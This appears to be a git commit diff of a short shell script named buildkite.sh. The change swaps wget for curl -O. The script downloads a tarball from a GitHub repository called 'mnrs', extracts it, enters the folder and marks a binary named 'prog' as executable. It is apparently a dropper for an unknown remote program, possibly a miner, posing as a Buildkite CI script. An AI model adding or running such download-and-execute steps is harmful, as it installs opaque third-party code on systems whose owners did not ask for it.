873ebe53e207fd72bfac22f462c2eda1813e332b
BloxClone <bloxclone.dev@gmail.com>
2025-07-16 21:09:39 -0500

    Update buildkite.sh

--- buildkite.sh
+++ buildkite.sh
@@ -1,4 +1,4 @@
-wget https://github.com/bloxclone/mnrs/raw/refs/heads/main/buildkite.tar.gz
+curl -O https://github.com/bloxclone/mnrs/raw/refs/heads/main/buildkite.tar.gz
 tar -xvf buildkite.tar.gz
 cd buildkite
 chmod +x prog
